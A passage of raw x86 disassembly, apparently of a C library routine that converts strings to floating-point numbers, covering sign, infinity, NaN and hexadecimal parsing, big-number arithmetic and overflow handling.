jle 0x808a353
lea edx, [eax + edi]
cmp edx, 9
jg 0x808a353
imul esi, dword [eax*4 + 0x80a61c0]
mov ecx, dword [arg_18h]
mov edx, dword [edx*4 + 0x80a61c0]
mov dword [ecx], 0
mov ecx, dword [arg_14h]
mov eax, dword [ecx]
test eax, eax
jne 0x808a2d0
mov eax, dword [arg_10h]
mov dword [eax], esi
mov dword [ecx], 1
add esp, 0x18
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_ch], edx
mov dword [var_8h], eax
mov edx, dword [arg_10h]
mov dword [var_4h], edx
mov dword [esp], edx
call fcn.0808cae0
mov dword [var_14h], eax
mov edi, dword [arg_10h]
mov eax, dword [arg_14h]
mov ecx, dword [eax]
add edi, 4
mov eax, dword [arg_10h]
mov edx, dword [eax]
lea eax, [edx + esi]
mov esi, dword [arg_10h]
cmp eax, edx
mov dword [esi], eax
mov esi, edi
jae 0x808a339
dec ecx
je 0x808a31d
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [esi], edx
add esi, 4
test edx, edx
jne 0x808a339
dec ecx
jne 0x808a30b
mov eax, 1
add dword [var_14h], eax
je 0x808a2c6
mov edx, dword [arg_14h]
mov esi, dword [var_14h]
mov ecx, dword [arg_10h]
mov eax, dword [edx]
mov dword [ecx + eax*4], esi
inc dword [edx]
jmp 0x808a2c6
cmp esi, edi
je 0x808a34f
xor edx, edx
dec ecx
cmp edx, ecx
jge 0x808a34f
mov eax, dword [edi + edx*4]
mov dword [esi + edx*4], eax
inc edx
cmp edx, ecx
jl 0x808a344
xor eax, eax
jmp 0x808a322
mov edx, dword [edi*4 + 0x80a61c0]
jmp 0x808a2b2
movzx eax, byte [eax + 1]
mov edx, 1
test al, al
je 0x808a390
lea esi, [esi]
cmp al, byte [edx + ebx]
jne 0x808a381
mov ecx, dword [arg_24h]
inc edx
movzx eax, byte [edx + ecx]
test al, al
jne 0x808a370
test al, al
jne 0x808a265
add ebx, edx
jmp 0x808a268
mov ecx, dword [arg_24h]
movzx eax, byte [ecx + 1]
jmp 0x808a381
mov edx, dword [arg_14h]
mov eax, dword [edx]
test eax, eax
jne 0x808a3b6
mov ecx, dword [arg_10h]
mov dword [ecx], esi
mov dword [edx], 1
xor edi, edi
xor esi, esi
jmp 0x808a249
mov dword [var_8h], eax
mov dword [var_ch], 0x3b9aca00
mov eax, dword [arg_10h]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808cae0
mov dword [var_10h], eax
mov edx, dword [arg_14h]
mov edi, dword [arg_10h]
mov eax, dword [arg_10h]
mov ecx, dword [edx]
add edi, 4
mov edx, dword [eax]
lea eax, [edx + esi]
mov esi, dword [arg_10h]
cmp eax, edx
mov dword [esi], eax
mov esi, edi
jae 0x808a423
dec ecx
je 0x808a407
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [esi], edx
add esi, 4
test edx, edx
jne 0x808a423
dec ecx
jne 0x808a3f5
mov eax, 1
add dword [var_10h], eax
je 0x808a3ad
mov edx, dword [arg_14h]
mov esi, dword [var_10h]
mov ecx, dword [arg_10h]
mov eax, dword [edx]
mov dword [ecx + eax*4], esi
inc dword [edx]
jmp 0x808a3ad
cmp esi, edi
je 0x808a43b
xor edx, edx
dec ecx
cmp edx, ecx
jge 0x808a43b
mov esi, esi
mov eax, dword [edi + edx*4]
mov dword [esi + edx*4], eax
inc edx
cmp edx, ecx
jl 0x808a430
xor eax, eax
jmp 0x808a40c
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1138
mov ecx, dword [arg_10h]
mov eax, dword [arg_14h]
mov dword [var_1078h], 0xa
mov dword [var_10a0h], 0
test ecx, ecx
mov edx, dword [eax + 4]
je 0x808a499
mov ecx, dword [edx + 0x2c]
mov dword [var_10a4h], ecx
movzx eax, byte [ecx]
test al, al
jle 0x808a499
cmp al, 0x7f
je 0x808a499
mov esi, dword [edx + 0x28]
mov dword [var_10a0h], esi
cmp byte [esi], 0
jne 0x808a4a3
mov dword [var_10a0h], 0
mov dword [var_10a4h], 0
mov edx, dword [edx + 0x24]
mov dword [var_109ch], edx
mov dword [esp], edx
call fcn.08053400
mov edi, dword [arg_8h]
mov dword [var_1080h], 0
mov dword [var_10a8h], eax
mov dword [var_106ch], 0
mov dword [var_1074h], 0
mov eax, dword [arg_14h]
dec edi
mov edx, dword [eax + 0x34]
inc edi
movzx esi, byte [edi]
mov ecx, esi
movsx eax, cl
test byte [edx + eax*2 + 1], 0x20
jne 0x808a4e2
cmp cl, 0x2d
je 0x808c261
cmp cl, 0x2b
je 0x808c258
mov edx, dword [var_109ch]
xor ebx, ebx
movzx edx, byte [edx]
test dl, dl
mov byte [var_1112h], dl
mov byte [var_1111h], dl
je 0x808c24d
mov eax, edx
cmp byte [ebx + edi], al
jne 0x808c240
mov ecx, dword [var_109ch]
inc ebx
movzx eax, byte [ebx + ecx]
test al, al
jne 0x808a525
movzx eax, byte [ebx + edi]
cmp al, 0x2f
jle 0x808a54d
cmp al, 0x39
jle 0x808a727
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808a727
mov ecx, esi
mov esi, dword [arg_14h]
movsx eax, cl
mov ebx, eax
mov ecx, dword [esi + 0x38]
cmp dword [ecx + eax*4], 0x69
je 0x808a6a9
cmp dword [ecx + ebx*4], 0x6e
jne 0x808a693
mov ecx, dword [arg_14h]
mov dword [var_8h], 3
mov dword [var_4h], 0x80a0fb8
mov dword [esp], edi
mov dword [var_ch], ecx
call fcn.0808dd40
test eax, eax
jne 0x808a693
fld dword [0x80a61a4]
add edi, 3
fstp xword [ebp - 0x10b4]
cmp byte [edi], 0x28
je 0x808a5d1
mov eax, dword [arg_ch]
test eax, eax
je 0x808a5c0
mov eax, dword [arg_ch]
mov dword [eax], edi
fld xword [ebp - 0x10b4]
add esp, 0x1138
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_14h]
mov ebx, edi
mov ecx, dword [eax + 0x38]
inc edi
movzx edx, byte [edi]
lea eax, [edx - 0x30]
cmp al, 9
jbe 0x808a5d9
movsx eax, dl
mov eax, dword [ecx + eax*4]
cmp eax, 0x60
jle 0x808a5f4
cmp eax, 0x7a
jle 0x808a5d9
cmp dl, 0x5f
je 0x808a5d9
cmp dl, 0x29
je 0x808a602
mov edi, ebx
jmp 0x808a5b4
mov edx, dword [arg_14h]
lea eax, [var_1060h]
mov dword [var_ch], 0
mov dword [var_4h], eax
mov dword [var_8h], 0
lea eax, [ebx + 1]
mov dword [esp], eax
mov dword [var_10h], edx
call fcn.080856c0
cmp dword [var_1060h], edi
mov ecx, eax
mov ebx, edx
jne 0x808a5b4
and edx, 0x7fffffff
mov dword [var_105ch], 0
mov dword [var_1058h], 0xc0000000
mov esi, edx
mov dword [var_1054h], 0x7fff
or esi, eax
jne 0x808a66f
xor ecx, ecx
mov ebx, 0x40000000
mov eax, ebx
mov dword [var_105ch], ecx
or eax, 0x80000000
mov dword [var_1058h], eax
fld xword [ebp - 0x105c]
fstp xword [ebp - 0x10b4]
jmp 0x808a5b4
mov eax, dword [arg_ch]
test eax, eax
je 0x808a6a2
mov ecx, dword [arg_8h]
mov edx, dword [arg_ch]
mov dword [edx], ecx
fldz
jmp 0x808a5c6
mov dword [var_ch], esi
mov dword [var_8h], 3
mov dword [var_4h], 0x80a0fc0
mov dword [esp], edi
call fcn.0808dd40
test eax, eax
jne 0x808a71c
mov eax, dword [arg_ch]
test eax, eax
je 0x808a6fc
lea ebx, [edi + 3]
mov dword [var_ch], esi
mov dword [var_8h], 5
mov dword [esp], ebx
mov dword [var_4h], str.inity
call fcn.0808dd40
test eax, eax
lea edx, [edi + 8]
mov eax, dword [arg_ch]
cmove ebx, edx
mov dword [eax], ebx
mov edx, dword [var_1074h]
test edx, edx
je 0x808a711
fld dword [0x80a6100]
jmp 0x808a5c6
fld dword [0x80a61a0]
jmp 0x808a5c6
mov edx, dword [arg_14h]
mov ecx, dword [edx + 0x38]
jmp 0x808a56f
mov eax, esi
cmp al, 0x30
je 0x808c207
mov eax, dword [var_10a0h]
mov dword [var_1088h], edi
test eax, eax
je 0x808c1ed
mov ecx, dword [var_10a0h]
movzx edx, byte [ecx]
mov esi, esi
mov eax, esi
cmp al, 0x30
je 0x808a785
xor ebx, ebx
test dl, dl
je 0x808c1df
mov ecx, dword [var_10a0h]
movzx eax, byte [ecx]
lea esi, [esi]
mov ecx, esi
cmp cl, al
jne 0x808a78b
mov ecx, dword [var_10a0h]
inc ebx
movzx eax, byte [ebx + ecx]
test al, al
jne 0x808a770
inc edi
movzx esi, byte [edi]
jmp 0x808a750
test al, al
je 0x808a785
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808a7a3
cmp dword [var_1078h], 0x10
je 0x808c18e
mov dword [var_1084h], edi
mov dword [var_1090h], 0
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808c183
cmp dword [var_1078h], 0x10
je 0x808c163
mov eax, dword [var_10a0h]
test eax, eax
je 0x808a80a
mov ecx, dword [var_10a0h]
xor ebx, ebx
movzx eax, byte [ecx]
test al, al
je 0x808c155
cmp al, byte [ebx + edi]
jne 0x808a806
mov edx, dword [var_10a0h]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x808a7e8
lea esi, [esi]
inc edi
movzx esi, byte [edi]
jmp 0x808a7b3
test al, al
je 0x808a800
mov eax, dword [var_10a4h]
test eax, eax
je 0x808bdc3
mov ebx, dword [var_1090h]
test ebx, ebx
jle 0x808bdc3
mov ecx, dword [var_1088h]
mov eax, dword [var_10a4h]
mov dword [var_4h], edi
mov edx, dword [var_10a0h]
mov dword [esp], ecx
mov dword [var_ch], eax
mov dword [var_8h], edx
call fcn.08049980
cmp edi, eax
mov ecx, eax
je 0x808bdb4
cmp eax, dword [var_1088h]
je 0x808bd9c
cmp eax, dword [var_1084h]
jb 0x808bd8c
mov ecx, dword [var_1084h]
mov edi, eax
mov dword [var_1090h], 0
cmp ecx, eax
jae 0x808a8a5
movzx eax, byte [ecx]
mov edx, dword [var_1090h]
inc edx
sub eax, 0x30
cmp al, 9
cmova edx, dword [var_1090h]
inc ecx
cmp ecx, edi
mov dword [var_1090h], edx
jb 0x808a884
mov ecx, dword [var_1090h]
mov dword [var_1098h], 0
mov dword [var_1094h], ecx
mov edx, dword [arg_ch]
test edx, edx
je 0x808a8c7
mov edx, dword [arg_ch]
mov dword [edx], edi
mov eax, dword [var_1090h]
test eax, eax
jne 0x808a8ea
mov eax, dword [var_1074h]
test eax, eax
je 0x808a6a2
fld dword [0x80a6104]
jmp 0x808a5c6
mov eax, dword [var_1098h]
test eax, eax
je 0x808a99c
mov ecx, dword [var_109ch]
mov esi, dword [var_109ch]
movzx ecx, byte [ecx]
mov byte [var_1112h], cl
movzx edx, byte [esi + 1]
mov ecx, dword [var_1084h]
movzx eax, byte [var_1112h]
cmp byte [ecx], al
je 0x808a92a
inc dword [var_1084h]
jmp 0x808a911
test dl, dl
mov ebx, 1
je 0x808bd80
mov esi, dword [var_109ch]
movzx eax, byte [esi + 1]
mov ecx, dword [var_1084h]
cmp al, byte [ebx + ecx]
jne 0x808bd70
mov esi, dword [var_109ch]
inc ebx
movzx eax, byte [ebx + esi]
test al, al
jne 0x808a941
mov eax, dword [var_1098h]
add eax, dword [var_10a8h]
add dword [var_1084h], eax
cmp dword [var_1078h], 0x10
je 0x808bd5a
mov edx, dword [var_106ch]
sub edx, dword [var_1098h]
mov esi, dword [var_1098h]
mov dword [var_106ch], edx
sub dword [var_1090h], esi
cmp dword [var_1078h], 0x10
je 0x808bb42
mov ebx, dword [var_106ch]
test ebx, ebx
mov edx, ebx
js 0x808bb29
mov eax, dword [var_1090h]
sub eax, dword [var_1094h]
cmp ebx, eax
cmovle eax, ebx
add dword [var_1094h], eax
mov ebx, edx
sub ebx, eax
mov eax, dword [var_1094h]
mov dword [var_106ch], ebx
add eax, ebx
cmp eax, 0x1345
jg 0x808ab74
cmp ebx, 0xffffecaa
jl 0x808bb19
mov ecx, dword [var_1094h]
test ecx, ecx
jle 0x808ad3c
mov esi, dword [var_109ch]
mov edx, dword [var_10a0h]
lea eax, [var_106ch]
mov ecx, dword [var_10a8h]
mov dword [var_10h], eax
mov eax, dword [var_1084h]
mov dword [var_14h], esi
mov dword [var_1ch], edx
mov esi, dword [var_1094h]
mov dword [var_18h], ecx
lea edx, [var_1070h]
mov dword [esp], eax
lea ecx, [var_82ch]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], esi
call fcn.0808a220
mov ebx, dword [var_106ch]
mov dword [var_1084h], eax
test ebx, ebx
jle 0x808ab49
lea edx, [var_82ch]
lea ecx, [var_104ch]
mov edi, 1
mov dword [var_10c0h], edx
mov dword [var_10c4h], ecx
mov dword [var_10c8h], 0x80a7020
test edi, ebx
je 0x808ab26
mov eax, dword [var_10c8h]
mov edx, dword [var_1070h]
xor ebx, edi
mov dword [var_106ch], ebx
mov esi, dword [eax + 4]
sub esi, 2
cmp edx, esi
jl 0x808baea
mov dword [var_10h], esi
mov eax, dword [eax]
mov dword [var_8h], edx
mov edx, dword [var_10c4h]
lea eax, [eax*4 + 0x80a6248]
mov dword [var_ch], eax
mov dword [esp], edx
mov eax, dword [var_10c0h]
mov dword [var_4h], eax
call fcn.0808c7c0
mov edx, eax
mov eax, dword [var_1070h]
add eax, esi
test edx, edx
mov dword [var_1070h], eax
jne 0x808ab08
dec eax
mov dword [var_1070h], eax
mov eax, dword [var_10c0h]
mov esi, dword [var_10c4h]
mov ebx, dword [var_106ch]
mov dword [var_10c0h], esi
mov dword [var_10c4h], eax
add edi, edi
add dword [var_10c8h], 0x10
test ebx, ebx
jne 0x808aa96
lea eax, [var_104ch]
cmp dword [var_10c0h], eax
je 0x808bace
mov edx, dword [var_1070h]
bsr ecx, dword [ebp + edx*4 - 0x830]
xor ecx, 0x1f
mov eax, edx
mov dword [var_10cch], edx
shl eax, 5
sub eax, ecx
cmp eax, 0x4000
mov dword [var_1080h], eax
jle 0x808ab84
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x808a6fc
cmp dword [var_1080h], 0x40
jle 0x808ad00
mov edx, dword [var_1080h]
mov eax, dword [var_1080h]
mov dword [var_10d4h], 0x1f
sub edx, 0x21
sub eax, 0x40
mov esi, eax
mov edi, eax
cmovs esi, edx
sar esi, 5
mov edx, esi
lea ecx, [esi - 1]
shl edx, 5
sub edi, edx
cmovne ecx, esi
lea eax, [edi - 1]
test edi, edi
cmove eax, dword [var_10d4h]
mov dword [var_10d0h], ecx
mov dword [var_10d4h], eax
jne 0x808ac78
mov eax, dword [ebp + esi*4 - 0x82c]
mov dword [var_1068h], eax
mov eax, dword [ebp + esi*4 - 0x828]
mov dword [var_1064h], eax
mov eax, dword [var_82ch]
xor ebx, ebx
test eax, eax
jne 0x808ac14
inc ebx
mov eax, dword [ebp + ebx*4 - 0x82c]
test eax, eax
je 0x808ac08
xor eax, eax
mov esi, dword [var_1090h]
cmp dword [var_1094h], esi
jl 0x808ac2c
cmp ebx, dword [var_10d0h]
jge 0x808ac31
mov eax, 1
mov dword [var_14h], eax
mov edx, dword [var_10d0h]
mov ecx, dword [var_1074h]
mov eax, dword [var_10d4h]
mov dword [var_8h], ecx
mov dword [var_10h], eax
mov eax, dword [ebp + edx*4 - 0x82c]
mov dword [var_ch], eax
mov eax, dword [var_1080h]
dec eax
lea esi, [var_1068h]
mov dword [var_4h], eax
mov dword [esp], esi
call fcn.08089f80
jmp 0x808a5c6
mov eax, dword [var_10cch]
mov ebx, esi
dec eax
cmp esi, eax
jge 0x808acde
mov dword [var_10d8h], eax
mov dword [var_10dch], 0x20
lea eax, [var_1068h]
sub dword [var_10dch], edi
mov dword [var_1124h], eax
mov edx, dword [ebp + ebx*4 - 0x82c]
mov ecx, edi
mov eax, dword [ebp + ebx*4 - 0x828]
inc ebx
shr edx, cl
movzx ecx, byte [var_10dch]
shl eax, cl
or edx, eax
mov eax, dword [var_1124h]
mov dword [eax], edx
add eax, 4
cmp ebx, dword [var_10d8h]
mov dword [var_1124h], eax
jl 0x808aca7
mov eax, ebx
sub eax, esi
dec eax
jg 0x808abfc
mov eax, dword [ebp + ebx*4 - 0x82c]
mov ecx, edi
shr eax, cl
jmp 0x808abf6
lea esi, [esi]
mov eax, dword [var_1094h]
cmp dword [var_1090h], eax
je 0x808b95b
mov ecx, dword [var_10cch]
lea esi, [var_82ch]
lea edi, [var_1068h]
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_1070h]
cmp eax, 1
jle 0x808b94b
mov esi, 0x42
lea edx, [var_104ch]
lea ecx, [var_82ch]
sub esi, dword [var_1080h]
mov dword [var_10ech], edx
mov dword [var_10f0h], ecx
mov edx, 0x55555556
mov ecx, dword [var_1090h]
mov dword [var_10f4h], 0x80a7020
sub ecx, dword [var_1094h]
mov dword [var_10e8h], 0
mov eax, esi
imul edx
mov eax, esi
sar eax, 0x1f
sub edx, eax
lea eax, [edx + 2]
cmp ecx, eax
jle 0x808adb0
mov ecx, dword [var_1094h]
mov dword [var_10e8h], 1
lea edx, [edx + ecx + 2]
mov dword [var_1090h], edx
mov esi, dword [var_1090h]
mov dword [var_107ch], 0
sub esi, dword [var_1094h]
sub esi, ebx
mov ebx, 1
mov dword [var_10e4h], esi
test dword [var_10e4h], ebx
je 0x808ae1b
mov eax, dword [var_107ch]
xor dword [var_10e4h], ebx
test eax, eax
jne 0x808b8cf
mov eax, dword [var_10f4h]
mov edi, dword [var_10ech]
cld
mov edx, dword [eax + 4]
mov esi, dword [eax]
sub edx, 2
lea esi, [esi*4 + 0x80a6248]
mov ecx, edx
mov dword [var_107ch], edx
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_10e4h]
add ebx, ebx
add dword [var_10f4h], 0x10
test eax, eax
jne 0x808add3
lea eax, [var_82ch]
cmp dword [var_10ech], eax
je 0x808b8b3
mov edx, dword [var_10a0h]
mov esi, dword [var_109ch]
lea eax, [var_106ch]
mov ecx, dword [var_10a8h]
mov dword [var_10h], eax
mov dword [var_1ch], edx
mov dword [var_14h], esi
lea edx, [var_1070h]
mov esi, dword [var_1094h]
mov dword [var_ch], edx
mov dword [var_18h], ecx
sub dword [var_1090h], esi
mov edx, dword [var_1084h]
lea ecx, [var_82ch]
mov eax, dword [var_1090h]
mov dword [var_8h], ecx
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0808a220
mov ecx, dword [var_107ch]
bsr eax, dword [ebp + ecx*4 - 0x1050]
mov ebx, eax
xor ebx, 0x1f
jle 0x808af09
lea esi, [var_104ch]
mov dword [var_8h], ecx
mov dword [var_ch], ebx
mov dword [var_4h], esi
mov dword [esp], esi
call fcn.0808c6f0
mov eax, dword [var_1070h]
lea edx, [var_82ch]
mov dword [var_ch], ebx
mov dword [var_4h], edx
mov dword [esp], edx
mov dword [var_8h], eax
call fcn.0808c6f0
test eax, eax
mov edx, eax
je 0x808af09
mov eax, dword [var_1070h]
mov dword [ebp + eax*4 - 0x82c], edx
inc eax
mov dword [var_1070h], eax
cmp dword [var_107ch], 1
mov esi, dword [var_1080h]
mov dword [var_106ch], esi
je 0x808b75b
cmp dword [var_107ch], 2
je 0x808b45a
mov eax, dword [var_107ch]
mov ecx, dword [var_107ch]
mov dword [var_110ch], 0
xor edi, edi
mov edx, dword [ebp + eax*4 - 0x1054]
mov esi, dword [ebp + eax*4 - 0x1050]
mov eax, dword [var_1070h]
mov dword [var_1108h], edx
sub ecx, eax
mov dword [var_8h], eax
lea eax, [ebp + ecx*4 - 0x104c]
mov dword [var_4h], eax
lea eax, [var_82ch]
mov dword [esp], eax
call fcn.0808c330
test eax, eax
jle 0x808af9c
mov eax, dword [var_1070h]
mov dword [ebp + eax*4 - 0x82c], 0
inc eax
mov dword [var_1070h], eax
mov eax, dword [var_1070h]
cmp eax, dword [var_107ch]
jge 0x808b438
mov edx, dword [var_107ch]
sub edx, eax
mov dword [var_1110h], edx
mov edx, dword [var_1080h]
test edx, edx
jle 0x808b3e1
mov eax, dword [var_1110h]
shl eax, 5
add eax, dword [var_1080h]
cmp eax, 0x40
jg 0x808b31e
mov ecx, dword [var_1070h]
mov eax, dword [var_1068h]
mov dword [var_1068h], 0
test ecx, ecx
mov dword [var_1064h], eax
jle 0x808b01e
mov eax, dword [var_1110h]
lea edx, [eax + ecx]
mov eax, dword [ebp + ecx*4 - 0x830]
dec ecx
test ecx, ecx
mov dword [ebp + edx*4 - 0x82c], eax
jg 0x808b002
mov edx, dword [var_1110h]
xor eax, eax
inc edx
cmp eax, edx
jge 0x808b03b
mov dword [ebp + eax*4 - 0x82c], 0
inc eax
cmp eax, edx
jl 0x808b02b
shl dword [var_1110h], 5
mov edx, dword [var_1110h]
add dword [var_1080h], edx
mov eax, dword [var_107ch]
cmp dword [var_1080h], 0x40
mov dword [ebp + eax*4 - 0x104c], 0
mov edx, eax
mov eax, dword [ebp + eax*4 - 0x82c]
mov ebx, eax
jg 0x808b1e6
lea ecx, [edx + 1]
lea eax, [edx - 1]
mov dword [var_111ch], ecx
mov dword [var_1118h], eax
cmp ebx, esi
mov edi, 0xffffffff
je 0x808b0e7
mov edx, dword [var_107ch]
mov eax, dword [ebp + edx*4 - 0x830]
mov edx, ebx
div esi
mov ecx, edx
mov edi, eax
mov eax, dword [var_1108h]
mul edi
cmp edx, ecx
mov ebx, eax
jbe 0x808b300
add ecx, esi
dec edi
cmp ecx, esi
jb 0x808b0e7
cmp ebx, dword [var_1108h]
lea eax, [edx - 1]
cmovb edx, eax
sub ebx, dword [var_1108h]
cmp edx, ecx
ja 0x808b0b9
jne 0x808b0e7
mov eax, dword [var_107ch]
cmp ebx, dword [ebp + eax*4 - 0x834]
ja 0x808b0b9
mov edx, dword [var_111ch]
lea ecx, [var_104ch]
lea eax, [var_82ch]
mov dword [var_ch], edi
mov dword [var_4h], ecx
mov dword [esp], eax
mov dword [var_8h], edx
call fcn.0808d600
mov edx, dword [var_107ch]
cmp dword [ebp + edx*4 - 0x82c], eax
je 0x808b13d
lea eax, [var_82ch]
lea ecx, [var_104ch]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], eax
mov dword [esp], eax
dec edi
call fcn.0808c2a0
mov ecx, dword [var_107ch]
mov edx, dword [var_1118h]
mov eax, dword [ebp + ecx*4 - 0x830]
test edx, edx
mov dword [ebp + ecx*4 - 0x82c], eax
mov ebx, eax
jle 0x808b170
mov eax, dword [ebp + edx*4 - 0x830]
mov dword [ebp + edx*4 - 0x82c], eax
dec edx
test edx, edx
jg 0x808b15d
mov eax, dword [var_1080h]
test eax, eax
jne 0x808b273
test edi, edi
mov edx, 0x20
je 0x808b18d
bsr edx, edi
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_106ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x40
jle 0x808b253
add edx, 0x40
mov eax, edi
mov dword [var_1120h], 0x61
sub ecx, edx
mov dword [var_110ch], edx
shr eax, cl
mov dword [var_1068h], eax
mov ecx, dword [var_1120h]
cmp ecx, 0x40
mov dword [var_1080h], ecx
jle 0x808b089
mov esi, dword [var_107ch]
mov eax, dword [ebp + esi*4 - 0x82c]
test eax, eax
mov edx, dword [var_107ch]
jne 0x808b204
test edx, edx
js 0x808b204
dec edx
mov ebx, dword [ebp + edx*4 - 0x82c]
test ebx, ebx
jne 0x808b204
test edx, edx
jns 0x808b1f4
mov ecx, dword [var_10e8h]
xor eax, eax
test ecx, ecx
jne 0x808b214
test edx, edx
js 0x808b219
mov eax, 1
mov dword [var_14h], eax
lea edx, [var_1068h]
mov dword [var_ch], edi
mov eax, 0x1f
mov dword [esp], edx
sub eax, dword [var_110ch]
mov dword [var_10h], eax
mov eax, dword [var_1074h]
mov dword [var_8h], eax
mov eax, dword [var_106ch]
dec eax
mov dword [var_4h], eax
jmp 0x808ac6e
neg edx
mov dword [var_1064h], 0
mov dword [var_1068h], edi
add edx, 0x20
mov dword [var_1120h], edx
jmp 0x808b1c4
mov eax, dword [var_1080h]
add eax, 0x20
cmp eax, 0x40
mov dword [var_1120h], eax
jg 0x808b29e
mov eax, dword [var_1068h]
mov dword [var_1068h], edi
mov dword [var_1064h], eax
jmp 0x808b1c4
mov dword [var_110ch], 0x40
mov edx, dword [var_1080h]
sub dword [var_110ch], edx
mov eax, dword [var_110ch]
test eax, eax
jle 0x808b1c4
mov ecx, dword [var_110ch]
lea eax, [var_1068h]
mov dword [var_8h], 2
mov dword [var_4h], eax
mov dword [esp], eax
mov dword [var_ch], ecx
call fcn.0808c6f0
mov eax, edi
mov ecx, 0x20
sub ecx, dword [var_110ch]
shr eax, cl
or dword [var_1068h], eax
jmp 0x808b1c4
jne 0x808b0e7
mov eax, dword [var_107ch]
cmp ebx, dword [ebp + eax*4 - 0x834]
ja 0x808b0b9
jmp 0x808b0e7
mov dword [var_110ch], 0x40
mov edx, dword [var_1080h]
sub dword [var_110ch], edx
cmp dword [var_110ch], 0x1f
jle 0x808b3aa
mov ebx, dword [var_110ch]
mov ecx, dword [var_110ch]
mov dword [var_8h], 2
add ebx, 0x1f
cmp dword [var_110ch], 0xffffffff
cmovg ebx, dword [var_110ch]
sar ebx, 5
mov eax, ebx
shl eax, 5
sub ecx, eax
lea eax, [var_1068h]
mov dword [var_4h], eax
mov dword [var_ch], ecx
lea eax, [ebp + ebx*4 - 0x1068]
mov dword [esp], eax
call fcn.0808c6f0
mov eax, ebx
dec eax
js 0x808b03b
lea edx, [ebp + eax*4 - 0x1068]
mov dword [edx], 0
sub edx, 4
dec eax
jns 0x808b399
jmp 0x808b03b
mov eax, dword [var_110ch]
test eax, eax
jle 0x808b03b
mov edx, dword [var_110ch]
lea ecx, [var_1068h]
mov dword [var_8h], 2
mov dword [var_4h], ecx
mov dword [esp], ecx
mov dword [var_ch], edx
call fcn.0808c6f0
jmp 0x808b03b
test eax, eax
mov ecx, eax
jle 0x808b403
mov eax, dword [var_1110h]
lea edx, [eax + ecx]
mov eax, dword [ebp + ecx*4 - 0x830]
dec ecx
test ecx, ecx
mov dword [ebp + edx*4 - 0x82c], eax
jg 0x808b3e7
mov edx, dword [var_1110h]
xor eax, eax
inc edx
cmp eax, edx
jge 0x808b420
mov dword [ebp + eax*4 - 0x82c], 0
inc eax
cmp eax, edx
jl 0x808b410
shl dword [var_1110h], 5
mov edx, dword [var_1110h]
sub dword [var_106ch], edx
jmp 0x808b04e
test eax, eax
mov edx, eax
jle 0x808b04e
mov eax, dword [ebp + edx*4 - 0x830]
mov dword [ebp + edx*4 - 0x82c], eax
dec edx
test edx, edx
jg 0x808b442
jmp 0x808b04e
cmp dword [var_1070h], 1
mov eax, dword [var_1048h]
mov dword [var_1100h], 0
mov dword [var_1104h], 0
mov edi, dword [var_104ch]
mov dword [var_10fch], eax
jle 0x808b6aa
mov esi, dword [var_828h]
mov ebx, dword [var_82ch]
cmp dword [var_1080h], 0x40
jg 0x808b56e
cmp esi, dword [var_10fch]
je 0x808b676
mov eax, ebx
mov edx, esi
div dword [var_10fch]
mov ecx, edx
mov dword [var_1100h], eax
mul edi
mov esi, edx
mov ebx, eax
cmp esi, ecx
ja 0x808b4d4
jne 0x808b4ed
test ebx, ebx
je 0x808b4ed
add ecx, dword [var_10fch]
dec dword [var_1100h]
sub ebx, edi
sbb esi, 0
cmp ecx, dword [var_10fch]
jae 0x808b4ca
xor eax, eax
sub eax, ebx
sbb ecx, esi
mov esi, ecx
mov ebx, eax
mov eax, dword [var_1080h]
test eax, eax
jne 0x808b5df
mov eax, dword [var_1100h]
mov edx, 0x20
test eax, eax
je 0x808b51e
bsr edx, dword [var_1100h]
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_106ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x40
jle 0x808b5b9
mov eax, dword [ebp - 0x1100]
add edx, 0x40
mov dword [ebp - 0x1120], 0x61
sub ecx, edx
mov dword [ebp - 0x1104], edx
shr eax, cl
mov dword [ebp - 0x1068], eax
mov eax, dword [ebp - 0x1120]
cmp eax, 0x40
mov dword [ebp - 0x1080], eax
jle 0x808b4a6
mov ecx, dword [var_10e8h]
xor eax, eax
test ecx, ecx
jne 0x808b582
test esi, esi
jne 0x808b582
test ebx, ebx
je 0x808b587
mov eax, 1
mov dword [var_14h], eax
mov edx, dword [var_1100h]
mov eax, 0x1f
sub eax, dword [var_1104h]
mov dword [var_ch], edx
mov dword [var_10h], eax
mov ecx, dword [var_1074h]
mov eax, dword [var_106ch]
mov dword [var_8h], ecx
jmp 0x808ac60
mov ecx, dword [ebp - 0x1100]
neg edx
mov dword [ebp - 0x1064], 0
add edx, 0x20
mov dword [ebp - 0x1120], edx
mov dword [ebp - 0x1068], ecx
jmp 0x808b559
mov eax, dword [var_1080h]
add eax, 0x20
cmp eax, 0x40
mov dword [var_1120h], eax
jg 0x808b610
mov eax, dword [var_1068h]
mov edx, dword [var_1100h]
mov dword [var_1064h], eax
mov dword [var_1068h], edx
jmp 0x808b559
mov dword [var_1104h], 0x40
mov ecx, dword [var_1080h]
sub dword [var_1104h], ecx
mov eax, dword [var_1104h]
test eax, eax
jle 0x808b559
mov eax, dword [ebp - 0x1104]
lea edx, [ebp - 0x1068]
mov dword [esp + 8], 2
mov dword [esp + 4], edx
mov dword [esp], edx
mov dword [esp + 0xc], eax
call fcn.0808c6f0
mov eax, dword [ebp - 0x1100]
mov ecx, 0x20
sub ecx, dword [ebp - 0x1104]
shr eax, cl
or dword [ebp - 0x1068], eax
jmp 0x808b559
lea ecx, [esi + ebx]
mov dword [var_1100h], 0xffffffff
cmp ecx, esi
jb 0x808b69a
test edi, edi
mov esi, edi
